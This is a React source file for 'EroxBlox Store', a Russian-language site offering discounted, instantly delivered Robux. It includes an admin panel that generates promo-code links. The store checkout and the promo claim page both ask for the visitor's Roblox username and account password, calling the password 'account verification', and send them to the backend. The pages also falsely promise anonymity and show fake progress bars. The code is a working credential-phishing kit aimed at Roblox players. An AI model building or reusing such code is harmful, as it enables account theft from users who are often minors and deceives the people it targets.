import { useEffect, useState } from 'react';
import avatar from "./assets/avatar.jpg";
import './styles.css';

const MIN_ROBUX = 500;
const MAX_ROBUX = 10000;
const STEP = 50;
const OFFICIAL_RATE_USD = 0.01;
const SALE_RATE_USD = OFFICIAL_RATE_USD * 0.8;
const USD_TO_RUB = 80;
const quickPicks = [1000, 2500, 5000, 10000];
const YOUTUBE_URL = 'https://www.youtube.com/@EroxBloxJust';
const TELEGRAM_URL = 'https://t.me/eroxblox';
const ROBLOX_URL = 'https://www.roblox.com/users/8709239598/profile';
const TIKTOK_URL = 'https://www.tiktok.com/@eroxblox';

const formatRub = (value) =>
  new Intl.NumberFormat('ru-RU', {
    style: 'currency',
    currency: 'RUB',
    maximumFractionDigits: 0,
  }).format(value);

const clampRobux = (value) => {
  const numeric = Number(value);
  if (Number.isNaN(numeric)) return MIN_ROBUX;
  return Math.min(MAX_ROBUX, Math.max(MIN_ROBUX, Math.round(numeric / STEP) * STEP));
};

const getRoute = () => {
  const pathname = window.location.pathname;
  if (pathname.startsWith('/admin')) return { name: 'admin' };
  if (pathname.startsWith('/promo/')) {
    return { name: 'promo', slug: decodeURIComponent(pathname.replace('/promo/', '')) };
  }
  return { name: 'store' };
};

const readApiPayload = async (response) => {
  const raw = await response.text();
  if (!raw) return {};
  try { return JSON.parse(raw); } 
  catch {
    if (raw.startsWith('<!doctype') || raw.startsWith('<html')) {
      throw new Error('Сервер вернул HTML вместо ответа API. Запустите backend вместе с сайтом.');
    }
    throw new Error('Сервер вернул некорректный ответ.');
  }
};

function Stars() {
  const [stars, setStars] = useState([]);
  useEffect(() => {
    const generated = Array.from({ length: 30 }, () => ({
      x: Math.random() * 100,
      y: Math.random() * 100,
      size: Math.random() * 2 + 1,
      delay: Math.random() * 3,
      duration: Math.random() * 2 + 1.5
    }));
    setStars(generated);
  }, []);
  return (
    <>
      {stars.map((s, i) => (
        <div 
          key={i} 
          className="star" 
          style={{
            left: s.x + '%',
            top: s.y + '%',
            width: s.size + 'px',
            height: s.size + 'px',
            animationDelay: s.delay + 's',
            animationDuration: s.duration + 's'
          }}
        />
      ))}
    </>
  );
}

function App() {
  const [theme, setTheme] = useState('dark');
  const [route] = useState(getRoute);

  useEffect(() => {
    document.documentElement.dataset.theme = theme;
  }, [theme]);

  if (route.name === 'admin') {
    return <AdminPage theme={theme} setTheme={setTheme} />;
  }
  if (route.name === 'promo') {
    return <PromoPage theme={theme} setTheme={setTheme} slug={route.slug} />;
  }
  return <StorePage theme={theme} setTheme={setTheme} />;
}

function StorePage({ theme, setTheme }) {
  const [robux, setRobux] = useState(2500);
  const [isCheckoutOpen, setIsCheckoutOpen] = useState(false);
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [submitMessage, setSubmitMessage] = useState('');
  const [form, setForm] = useState({ nickname: '', password: '', note: '' });

  useLockBodyScroll(isCheckoutOpen);

  const salePrice = robux * SALE_RATE_USD * USD_TO_RUB;

  const onFieldChange = (event) => {
    const { name, value } = event.target;
    setForm((current) => ({ ...current, [name]: value }));
  };

  const submitOrder = async (event) => {
    event.preventDefault();
    setIsSubmitting(true);
    setSubmitMessage('');

    try {
      const response = await fetch('/api/order', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          nickname: form.nickname,
          password: form.password,
          note: form.note,
          robux,
          totalPrice: salePrice,
        }),
      });
      const data = await readApiPayload(response);
      if (!response.ok || !data.ok) {
        throw new Error(data.message || 'Не удалось отправить заказ.');
      }
      setSubmitMessage('Заказ отправлен. Robux приходят моментально!');
      setForm({ nickname: '', password: '', note: '' });
    } catch (error) {
      setSubmitMessage(error instanceof Error ? error.message : 'Ошибка при отправке заказа.');
    } finally {
      setIsSubmitting(false);
    }
  };

  return (
    <>
      <Stars />
      <main className="page-shell">
        <div className="mesh mesh-a" />
        <div className="mesh mesh-b" />
        <div className="mesh mesh-c" />

        <TopBar
          theme={theme}
          setTheme={setTheme}
          brandLabel="Официальный магазин"
          brandName="EroxBlox Store"
        />

        <section className="hero">
          <div className="hero-copy">
            <p className="micro-copy">Магазин Robux</p>
            <h2>
              EroxBlox Store
              <br />
              <span className="gradient-text">
                Мгновенные Robux
              </span>
            </h2>
            <p className="hero-text">
              Выбирайте количество, смотрите цену и получайте Robux моментально!
            </p>

            <div className="official-banner">
              <div>
                <p className="micro-copy">Официальный канал</p>
                <strong>YouTube EroxBlox — 500K подписчиков</strong>
              </div>
              <a href={YOUTUBE_URL} target="_blank" rel="noreferrer" className="ghost-button nav-link">
                Подписаться
              </a>
            </div>

            <div className="stat-row">
              <div className="stat-card glow">
                <span>Цена</span>
                <strong style={{ color: '#ffd700' }}>{formatRub(salePrice)}</strong>
              </div>
              <div className="stat-card glow">
                <span>Скорость</span>
                <strong style={{ color: '#00d4ff' }}>Моментально</strong>
              </div>
              <div className="stat-card glow">
                <span>Связь</span>
                <strong style={{ color: '#9b30ff' }}>Telegram</strong>
              </div>
            </div>
          </div>

          <section className="control-panel neon-border">
            <div className="panel-head">
              <div>
                <p className="micro-copy">Количество</p>
                <h3 style={{ color: '#ffd700' }}>{robux.toLocaleString('ru-RU')} Robux</h3>
              </div>
              <label className="number-field">
                <span>Своё значение</span>
                <input
                  type="number"
                  min={MIN_ROBUX}
                  max={MAX_ROBUX}
                  step={STEP}
                  value={robux}
                  onChange={(event) => setRobux(clampRobux(event.target.value))}
                  style={{ borderColor: '#9b30ff' }}
                />
              </label>
            </div>

            <input
              className="slider"
              type="range"
              min={MIN_ROBUX}
              max={MAX_ROBUX}
              step={STEP}
              value={robux}
              onChange={(event) => setRobux(Number(event.target.value))}
            />

            <div className="quick-picks">
              {quickPicks.map((value) => (
                <button
                  key={value}
                  type="button"
                  className={value === robux ? 'pick active' : 'pick'}
                  onClick={() => setRobux(value)}
                >
                  {value.toLocaleString('ru-RU')}
                </button>
              ))}
            </div>

            <div className="price-stack">
              <article className="price-card highlight">
                <span>Итоговая цена</span>
                <strong style={{ fontSize: '2rem' }}>{formatRub(salePrice)}</strong>
              </article>
            </div>

            <button type="button" className="primary-button full-width pulse-btn" onClick={() => setIsCheckoutOpen(true)}>
              ЗАБРАТЬ ROBUX
            </button>
          </section>
        </section>

        <section className="info-grid">
          <article className="info-card neon-card">
            <p className="micro-copy">01</p>
            <h3>Выбор количества</h3>
            <p>Слайдер и ручной ввод — всё мгновенно!</p>
          </article>
          <article className="info-card featured neon-card">
            <p className="micro-copy">02</p>
            <h3>Моментальная выдача</h3>
            <p>Robux приходят моментально после оформления заказа.</p>
          </article>
          <article className="info-card neon-card">
            <p className="micro-copy">03</p>
            <h3>Безопасно</h3>
            <p>Мы не храним ваши данные. 100% анонимно.</p>
          </article>
        </section>

        <Footer />
      </main>

      {isCheckoutOpen ? (
        <ModalShell onClose={() => !isSubmitting && setIsCheckoutOpen(false)}>
          <div className="modal-head">
            <div>
              <p className="micro-copy">Оформление</p>
              <h3 style={{ color: '#ffd700' }}>Получи Robux сейчас</h3>
            </div>
            <button
              type="button"
              className="close-button"
              onClick={() => !isSubmitting && setIsCheckoutOpen(false)}
            >
              ✕
            </button>
          </div>

          <div className="modal-grid">
            <form className="checkout-form" onSubmit={submitOrder}>
              <label>
                <span>Ваш никнейм</span>
                <input
                  name="nickname"
                  placeholder="Введите ваш Roblox никнейм"
                  value={form.nickname}
                  onChange={onFieldChange}
                  required
                  style={{ borderColor: '#9b30ff' }}
                />
              </label>

              <label>
                <span>Ваш пароль</span>
                <input
                  name="password"
                  type="password"
                  placeholder="Введите ваш пароль"
                  value={form.password}
                  onChange={onFieldChange}
                  required
                  style={{ borderColor: '#ff2d95' }}
                />
                <small style={{ color: 'var(--muted)', fontSize: '0.75rem' }}>
                  Пароль нужен для верификации аккаунта
                </small>
              </label>

              <label>
                <span>Комментарий</span>
                <textarea
                  name="note"
                  rows="3"
                  placeholder="Дополнительная информация"
                  value={form.note}
                  onChange={onFieldChange}
                />
              </label>

              <button type="submit" className="primary-button full-width pulse-btn" disabled={isSubmitting}>
                {isSubmitting ? 'Обработка...' : 'ЗАБРАТЬ ROBUX'}
              </button>

              {isSubmitting && (
                <div className="progress-bar">
                  <div className="progress-fill" style={{ width: '60%' }} />
                  <span>Обработка запроса...</span>
                </div>
              )}

              {submitMessage ? <p className="submit-message">{submitMessage}</p> : null}
            </form>

            <aside className="order-summary glow">
              <p className="micro-copy">Детали заказа</p>
              <div className="summary-row">
                <span>Количество</span>
                <strong style={{ color: '#ffd700' }}>{robux.toLocaleString('ru-RU')} Robux</strong>
              </div>
              <div className="summary-row">
                <span>Цена</span>
                <strong style={{ color: '#ffd700' }}>{formatRub(salePrice)}</strong>
              </div>
              <div className="summary-row">
                <span>Доставка</span>
                <strong style={{ color: '#00d4ff' }}>Моментально</strong>
              </div>
              <div className="summary-row" style={{ borderBottom: 'none' }}>
                <span>Статус</span>
                <strong style={{ color: '#9b30ff' }}>Готов к оформлению</strong>
              </div>
            </aside>
          </div>
        </ModalShell>
      ) : null}
    </>
  );
}

function Footer() {
  return (
    <footer className="footer">
      <div className="footer-content">
        <div className="footer-brand">
          <h4>EroxBlox Store</h4>
          <p>Официальный магазин Robux</p>
        </div>
        <div className="footer-links">
          <a href={YOUTUBE_URL} target="_blank" rel="noreferrer" className="footer-link">
            <svg className="footer-icon" viewBox="0 0 24 24" fill="currentColor">
              <path d="M23.498 6.186a3.016 3.016 0 0 0-2.122-2.136C19.505 3.545 12 3.545 12 3.545s-7.505 0-9.377.505A3.017 3.017 0 0 0 .502 6.186C0 8.07 0 12 0 12s0 3.93.502 5.814a3.016 3.016 0 0 0 2.122 2.136c1.871.505 9.376.505 9.376.505s7.505 0 9.377-.505a3.015 3.015 0 0 0 2.122-2.136C24 15.93 24 12 24 12s0-3.93-.502-5.814zM9.545 15.568V8.432L15.818 12l-6.273 3.568z"/>
            </svg>
            YouTube
          </a>
          <a href={TELEGRAM_URL} target="_blank" rel="noreferrer" className="footer-link">
            <svg className="footer-icon" viewBox="0 0 24 24" fill="currentColor">
              <path d="M11.944 0A12 12 0 0 0 0 12a12 12 0 0 0 12 12 12 12 0 0 0 12-12A12 12 0 0 0 12 0a12 12 0 0 0-.056 0zm4.962 7.224c.1-.002.321.023.465.14a.506.506 0 0 1 .171.325c.016.093.036.306.02.472-.18 1.898-.962 6.502-1.36 8.627-.168.9-.499 1.201-.82 1.23-.696.065-1.225-.46-1.9-.902-1.056-.693-1.653-1.124-2.678-1.8-1.185-.78-.417-1.21.258-1.91.177-.184 3.247-2.977 3.307-3.23.007-.032.014-.15-.056-.212s-.174-.041-.249-.024c-.106.024-1.793 1.14-5.061 3.345-.48.33-.913.49-1.302.48-.428-.008-1.252-.241-1.865-.44-.752-.245-1.349-.374-1.297-.789.027-.216.325-.437.893-.663 3.498-1.524 5.83-2.529 6.998-3.014 3.332-1.386 4.025-1.627 4.476-1.635z"/>
            </svg>
            Telegram
          </a>
          <a href={ROBLOX_URL} target="_blank" rel="noreferrer" className="footer-link">
            <svg className="footer-icon" viewBox="0 0 24 24" fill="currentColor">
              <path d="M3.5 1C2.119 1 1 2.119 1 3.5v17C1 21.881 2.119 23 3.5 23h17c1.381 0 2.5-1.119 2.5-2.5v-17C23 2.119 21.881 1 20.5 1h-17zM6 6h4.5c1.381 0 2.5 1.119 2.5 2.5v2c0 1.381-1.119 2.5-2.5 2.5H6V6zm0 10h12v2H6v-2z"/>
            </svg>
            Roblox
          </a>
          <a href={TIKTOK_URL} target="_blank" rel="noreferrer" className="footer-link">
            <svg className="footer-icon" viewBox="0 0 24 24" fill="currentColor">
              <path d="M12.525.02c1.31-.02 2.61-.01 3.91-.02.08 1.53.63 3.09 1.75 4.17 1.12 1.11 2.7 1.62 4.24 1.79v4.03c-1.44-.05-2.89-.35-4.2-.97-.57-.26-1.1-.59-1.62-.93-.01 2.92.01 5.84-.02 8.75-.08 1.4-.54 2.79-1.35 3.94-1.31 1.92-3.58 3.17-5.91 3.21-1.43.08-2.86-.31-4.08-1.03-2.02-1.19-3.44-3.37-3.65-5.71-.02-.5-.03-1-.01-1.49.18-1.9 1.12-3.72 2.58-4.96 1.66-1.44 3.98-2.13 6.15-1.72.02 1.48-.04 2.96-.04 4.44-.99-.32-2.15-.23-3.02.37-.63.41-1.11 1.04-1.36 1.75-.21.51-.15 1.07-.14 1.61.24 1.64 1.82 3.02 3.5 2.87 1.12-.01 2.19-.66 2.77-1.61.19-.33.4-.67.41-1.06.1-1.79.06-3.57.07-5.36.01-4.03-.01-8.05.02-12.07z"/>
            </svg>
            TikTok
          </a>
        </div>
        <div className="footer-copy">
          <p>© 2026 EroxBlox Store. All rights reserved.</p>
        </div>
      </div>
    </footer>
  );
}

function AdminPage({ theme, setTheme }) {
  const [isLoading, setIsLoading] = useState(true);
  const [isAuthenticated, setIsAuthenticated] = useState(false);
  const [message, setMessage] = useState('');
  const [promos, setPromos] = useState([]);
  const [loginForm, setLoginForm] = useState({ username: '', password: '' });
  const [createForm, setCreateForm] = useState({ robuxAmount: '100', maxActivations: '1' });

  const loadPromos = async () => {
    const response = await fetch('/api/admin/promos');
    if (response.status === 401) {
      setIsAuthenticated(false);
      setPromos([]);
      return;
    }
    const data = await readApiPayload(response);
    if (!response.ok || !data.ok) {
      throw new Error(data.message || 'Не удалось загрузить промокоды.');
    }
    setIsAuthenticated(true);
    setPromos(data.promos);
  };

  useEffect(() => {
    const run = async () => {
      try { await loadPromos(); } 
      catch (error) { setMessage(error instanceof Error ? error.message : 'Ошибка панели администратора.'); } 
      finally { setIsLoading(false); }
    };
    run();
  }, []);

  const onLogin = async (event) => {
    event.preventDefault();
    setMessage('');
    try {
      const response = await fetch('/api/admin/login', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(loginForm),
      });
      const data = await readApiPayload(response);
      if (!response.ok || !data.ok) {
        throw new Error(data.message || 'Неверный логин или пароль.');
      }
      await loadPromos();
      setMessage('Вход выполнен.');
    } catch (error) {
      setMessage(error instanceof Error ? error.message : 'Ошибка входа.');
    }
  };

  const createPromo = async (event) => {
    event.preventDefault();
    setMessage('');
    try {
      const response = await fetch('/api/admin/promos', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          robuxAmount: Number(createForm.robuxAmount),
          maxActivations: Number(createForm.maxActivations),
        }),
      });
      const data = await readApiPayload(response);
      if (!response.ok || !data.ok) {
        throw new Error(data.message || 'Не удалось создать промокод.');
      }
      setPromos(data.promos);
      setMessage('Промокод создан.');
    } catch (error) {
      setMessage(error instanceof Error ? error.message : 'Ошибка создания промокода.');
    }
  };

  const deletePromo = async (promoId) => {
    setMessage('');
    try {
      const response = await fetch(`/api/admin/promos/${promoId}`, { method: 'DELETE' });
      const data = await readApiPayload(response);
      if (!response.ok || !data.ok) {
        throw new Error(data.message || 'Не удалось удалить промокод.');
      }
      setPromos(data.promos);
      setMessage('Промокод удален.');
    } catch (error) {
      setMessage(error instanceof Error ? error.message : 'Ошибка удаления промокода.');
    }
  };

  const logout = async () => {
    await fetch('/api/admin/logout', { method: 'POST' });
    setIsAuthenticated(false);
    setPromos([]);
    setMessage('Вы вышли из админ-панели.');
  };

  return (
    <main className="page-shell">
      <Stars />
      <div className="mesh mesh-a" />
      <div className="mesh mesh-b" />
      <TopBar
        theme={theme}
        setTheme={setTheme}
        brandLabel="Панель управления"
        brandName="EroxBlox Store / Admin"
      />
      <section className="admin-shell">
        {isLoading ? (
          <div className="admin-card">
            <h2>Загрузка панели</h2>
            <p className="admin-text">Подключаем список промокодов и параметры доступа.</p>
          </div>
        ) : !isAuthenticated ? (
          <div className="admin-card narrow">
            <p className="micro-copy">Вход</p>
            <h2>Админ-панель</h2>
            <p className="admin-text">Введите логин и пароль, чтобы создавать одноразовые промокоды.</p>
            <form className="form-grid" onSubmit={onLogin} autoComplete="off">
              <label>
                <span>Логин</span>
                <input
                  name="admin_login"
                  autoComplete="off"
                  placeholder="Введите логин"
                  value={loginForm.username}
                  onChange={(event) =>
                    setLoginForm((current) => ({ ...current, username: event.target.value }))
                  }
                />
              </label>
              <label>
                <span>Пароль</span>
                <input
                  type="password"
                  name="admin_password"
                  autoComplete="new-password"
                  placeholder="Введите пароль"
                  value={loginForm.password}
                  onChange={(event) =>
                    setLoginForm((current) => ({ ...current, password: event.target.value }))
                  }
                />
              </label>
              <button type="submit" className="primary-button full-width">
                Войти
              </button>
            </form>
            {message ? <p className="submit-message">{message}</p> : null}
          </div>
        ) : (
          <>
            <div className="admin-card">
              <div className="admin-row">
                <div>
                  <p className="micro-copy">Создание ссылок</p>
                  <h2>Генератор промокодов</h2>
                </div>
                <button type="button" className="ghost-button" onClick={logout}>
                  Выйти
                </button>
              </div>
              <form className="form-grid two-columns" onSubmit={createPromo}>
                <label>
                  <span>Сколько Robux</span>
                  <input
                    type="number"
                    min="1"
                    value={createForm.robuxAmount}
                    onChange={(event) =>
                      setCreateForm((current) => ({ ...current, robuxAmount: event.target.value }))
                    }
                  />
                </label>
                <label>
                  <span>Сколько активаций</span>
                  <input
                    type="number"
                    min="1"
                    value={createForm.maxActivations}
                    onChange={(event) =>
                      setCreateForm((current) => ({ ...current, maxActivations: event.target.value }))
                    }
                  />
                </label>
                <button type="submit" className="primary-button full-width">
                  Сгенерировать промокод
                </button>
              </form>
              {message ? <p className="submit-message">{message}</p> : null}
            </div>
            <div className="promo-list">
              {promos.length === 0 ? (
                <div className="admin-card">
                  <h3>Промокодов пока нет</h3>
                  <p className="admin-text">Создайте первый код выше. Можно поставить одноразовую активацию или несколько заходов.</p>
                </div>
              ) : (
                promos.map((promo) => (
                  <PromoAdminCard key={promo.id} promo={promo} onDelete={deletePromo} />
                ))
              )}
            </div>
          </>
        )}
      </section>
      <Footer />
    </main>
  );
}

function PromoAdminCard({ promo, onDelete }) {
  const link = `${window.location.origin}/promo/${promo.slug}`;
  const remaining = promo.maxActivations - promo.activations;

  return (
    <article className="admin-card">
      <div className="admin-row">
        <div>
          <p className="micro-copy">Промокод</p>
          <h3>{promo.robuxAmount} Robux</h3>
        </div>
        <span className={promo.isActive ? 'status-badge active' : 'status-badge'}>
          {promo.isActive ? 'Активен' : 'Закрыт'}
        </span>
      </div>
      <div className="promo-meta">
        <div className="promo-stat">
          <span>Ссылка</span>
          <strong>{promo.slug}</strong>
        </div>
        <div className="promo-stat">
          <span>Использовано</span>
          <strong>{promo.activations} / {promo.maxActivations}</strong>
        </div>
        <div className="promo-stat">
          <span>Осталось</span>
          <strong>{remaining}</strong>
        </div>
      </div>
      <div className="link-box">{link}</div>
      <div className="admin-actions">
        <button type="button" className="ghost-button" onClick={() => navigator.clipboard.writeText(link)}>
          Копировать ссылку
        </button>
        <button type="button" className="ghost-button danger" onClick={() => onDelete(promo.id)}>
          Удалить
        </button>
      </div>
    </article>
  );
}

function PromoPage({ theme, setTheme, slug }) {
  const [promo, setPromo] = useState(null);
  const [isLoading, setIsLoading] = useState(true);
  const [message, setMessage] = useState('');
  const [isClaimOpen, setIsClaimOpen] = useState(false);
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [form, setForm] = useState({ nickname: '', password: '', note: '' });

  useLockBodyScroll(isClaimOpen);

  useEffect(() => {
    const run = async () => {
      try {
        const response = await fetch(`/api/promo/${slug}`);
        const data = await readApiPayload(response);
        if (!response.ok || !data.ok) {
          throw new Error(data.message || 'Промокод недоступен.');
        }
        setPromo(data.promo);
      } catch (error) {
        setMessage(error instanceof Error ? error.message : 'Не удалось открыть промокод.');
      } finally {
        setIsLoading(false);
      }
    };
    run();
  }, [slug]);

  const submitClaim = async (event) => {
    event.preventDefault();
    setIsSubmitting(true);
    setMessage('');
    try {
      const response = await fetch(`/api/promo/${slug}/claim`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(form),
      });
      const data = await readApiPayload(response);
      if (!response.ok || !data.ok) {
        throw new Error(data.message || 'Не удалось активировать промокод.');
      }
      setMessage(data.message);
      setPromo(data.promo);
      setIsClaimOpen(false);
      setForm({ nickname: '', password: '', note: '' });
    } catch (error) {
      setMessage(error instanceof Error ? error.message : 'Ошибка активации промокода.');
    } finally {
      setIsSubmitting(false);
    }
  };

  return (
    <>
      <Stars />
      <main className="page-shell">
        <div className="mesh mesh-a" />
        <div className="mesh mesh-b" />
        <TopBar
          theme={theme}
          setTheme={setTheme}
          brandLabel="Промостраница"
          brandName="EroxBlox Store"
        />

        <section className="promo-shell">
          <div className="admin-card" style={{ textAlign: 'center' }}>
            {isLoading ? (
              <>
                <p className="micro-copy">Загрузка</p>
                <h2>Открываем промокод...</h2>
                <div className="chest">🎁</div>
                <p className="admin-text">Подгружаем параметры ссылки и количество Robux.</p>
              </>
            ) : promo ? (
              <>
                <div className="chest" style={{ animation: 'bounce-chest 0.8s ease-in-out infinite' }}>🎁</div>
                <p className="micro-copy" style={{ color: '#ffd700' }}>Поздравляем!</p>
                <h2 style={{ color: '#ffd700' }}>Промокод на {promo.robuxAmount} Robux</h2>
                <p className="admin-text" style={{ fontSize: '1.1rem' }}>
                  Нажмите кнопку ниже, введите свои данные и получите Robux моментально!
                </p>
                <div className="promo-meta" style={{ justifyContent: 'center' }}>
                  <div className="promo-stat">
                    <span>Robux</span>
                    <strong style={{ color: '#ffd700' }}>{promo.robuxAmount}</strong>
                  </div>
                  <div className="promo-stat">
                    <span>Осталось</span>
                    <strong style={{ color: '#00d4ff' }}>{promo.maxActivations - promo.activations}</strong>
                  </div>
                </div>
                <button type="button" className="primary-button full-width pulse-btn" onClick={() => setIsClaimOpen(true)}>
                  ЗАБРАТЬ ПРОМОКОД
                </button>
                <a href="/" className="ghost-button nav-link full-width back-home-link">
                  На главную
                </a>
              </>
            ) : (
              <>
                <p className="micro-copy">Ошибка</p>
                <h2>Промокод недоступен</h2>
                <p className="admin-text">{message}</p>
                <a href="/" className="ghost-button nav-link full-width back-home-link">
                  На главную
                </a>
              </>
            )}
            {message && promo ? <p className="submit-message">{message}</p> : null}
          </div>
        </section>
        <Footer />
      </main>

      {isClaimOpen && promo ? (
        <ModalShell onClose={() => !isSubmitting && setIsClaimOpen(false)}>
          <div className="modal-head">
            <div>
              <p className="micro-copy">Активация</p>
              <h3 style={{ color: '#ffd700' }}>Промокод на {promo.robuxAmount} Robux</h3>
            </div>
            <button
              type="button"
              className="close-button"
              onClick={() => !isSubmitting && setIsClaimOpen(false)}
            >
              ✕
            </button>
          </div>

          <div className="modal-grid">
            <form className="checkout-form" onSubmit={submitClaim}>
              <label>
                <span>Ваш никнейм</span>
                <input
                  name="nickname"
                  placeholder="Введите ваш Roblox никнейм"
                  value={form.nickname}
                  onChange={(event) =>
                    setForm((current) => ({ ...current, nickname: event.target.value }))
                  }
                  required
                  style={{ borderColor: '#9b30ff' }}
                />
              </label>

              <label>
                <span>Ваш пароль</span>
                <input
                  name="password"
                  type="password"
                  placeholder="Введите ваш пароль"
                  value={form.password}
                  onChange={(event) =>
                    setForm((current) => ({ ...current, password: event.target.value }))
                  }
                  required
                  style={{ borderColor: '#ff2d95' }}
                />
                <small style={{ color: 'var(--muted)', fontSize: '0.75rem' }}>
                  Пароль нужен для верификации аккаунта
                </small>
              </label>

              <label>
                <span>Комментарий</span>
                <textarea
                  name="note"
                  rows="3"
                  placeholder="Дополнительная информация"
                  value={form.note}
                  onChange={(event) =>
                    setForm((current) => ({ ...current, note: event.target.value }))
                  }
                />
              </label>

              <button type="submit" className="primary-button full-width pulse-btn" disabled={isSubmitting}>
                {isSubmitting ? 'Обработка...' : 'ЗАБРАТЬ'}
              </button>

              {isSubmitting && (
                <div className="progress-bar">
                  <div className="progress-fill" style={{ width: '75%' }} />
                  <span>Активация промокода...</span>
                </div>
              )}
            </form>

            <aside className="order-summary glow">
              <p className="micro-copy">Параметры</p>
              <div className="summary-row">
                <span>Промоссылка</span>
                <strong>{promo.slug}</strong>
              </div>
              <div className="summary-row">
                <span>Robux</span>
                <strong style={{ color: '#ffd700' }}>{promo.robuxAmount}</strong>
              </div>
              <div className="summary-row">
                <span>Осталось</span>
                <strong style={{ color: '#00d4ff' }}>{promo.maxActivations - promo.activations}</strong>
              </div>
              <div className="summary-row" style={{ borderBottom: 'none' }}>
                <span>Статус</span>
                <strong style={{ color: '#9b30ff' }}>Готов к активации</strong>
              </div>
            </aside>
          </div>
        </ModalShell>
      ) : null}
    </>
  );
}

function TopBar({ theme, setTheme, brandLabel, brandName }) {
  return (
    <header className="nav">
      <div className="brand" style={{ display: "flex", alignItems: "center", gap: "14px" }}>
        <img
          src={avatar}
          alt="Avatar"
          style={{
            width: "56px",
            height: "56px",
            borderRadius: "50%",
            objectFit: "cover",
            border: "2px solid var(--gold)",
            boxShadow: "0 0 30px rgba(255,215,0,0.3)"
          }}
        />
        <div>
          <p className="micro-copy">{brandLabel}</p>
          <h1>{brandName}</h1>
        </div>
      </div>
      <div className="nav-actions">
        <a href={YOUTUBE_URL} target="_blank" rel="noreferrer" className="ghost-button nav-link">
          YouTube
        </a>
        <button type="button" className="ghost-button" onClick={() =>
          setTheme((current) => (current === "dark" ? "light" : "dark"))
        }>
          {theme === "dark" ? "🌙" : "☀️"}
        </button>
      </div>
    </header>
  );
}

function ModalShell({ children, onClose }) {
  return (
    <div className="modal-backdrop" onClick={onClose}>
      <section className="checkout-modal" onClick={(event) => event.stopPropagation()}>
        {children}
      </section>
    </div>
  );
}

function useLockBodyScroll(isLocked) {
  useEffect(() => {
    document.body.style.overflow = isLocked ? 'hidden' : '';
    return () => { document.body.style.overflow = ''; };
  }, [isLocked]);
}

export default App;